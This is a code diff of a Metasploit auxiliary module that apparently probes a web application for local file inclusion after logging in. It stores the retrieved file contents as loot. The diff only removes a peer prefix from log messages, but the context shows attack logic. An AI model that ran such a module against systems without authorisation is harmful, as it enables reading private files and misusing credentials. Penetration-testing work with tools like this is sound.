@@ -60,7 +60,7 @@ class Metasploit3 < Msf::Auxiliary
     })
 
     if res and res.code == 200 and res.body !~ /404\ File\ Not\ Found/
-      print_good("#{peer} - Request may have succeeded on file #{file}")
+      print_good("Request may have succeeded on file #{file}")
       report_web_vuln({
         :host     => rhost,
         :port     => rport,
@@ -75,9 +75,9 @@ class Metasploit3 < Msf::Auxiliary
       })
 
       loot = store_loot("lfi.data","text/plain", rhost, res.body, file)
-      vprint_good("#{peer} - File #{file} downloaded to: #{loot}")
+      vprint_good("File #{file} downloaded to: #{loot}")
     elsif res and res.code
-      vprint_error("#{peer} - Attempt returned HTTP error #{res.code} when trying to access #{file}")
+      vprint_error("Attempt returned HTTP error #{res.code} when trying to access #{file}")
     end
   end
 
@@ -85,7 +85,7 @@ class Metasploit3 < Msf::Auxiliary
     user = datastore['USERNAME']
     pass = datastore['PASSWORD']
 
-    vprint_status("#{peer} - Trying to login with #{user} / #{pass}")
+    vprint_status("Trying to login with #{user} / #{pass}")
 
     # test login
     begin
@@ -100,14 +100,14 @@ class Metasploit3 < Msf::Auxiliary
       return :abort if (res.code == 404)
 
       if [200, 301, 302].include?(res.code)
-        vprint_good("#{peer} - Successful login #{user}/#{pass}")
+        vprint_good("Successful login #{user}/#{pass}")
       else
-        vprint_error("#{peer} - No successful login possible with #{user}/#{pass}")
+        vprint_error("No successful login possible with #{user}/#{pass}")
         return :abort
       end
 
     rescue ::Rex::ConnectionError
-      vprint_error("#{peer} - Failed to connect to the web server")
+      vprint_error("Failed to connect to the web server")
       return :abort
     end
 
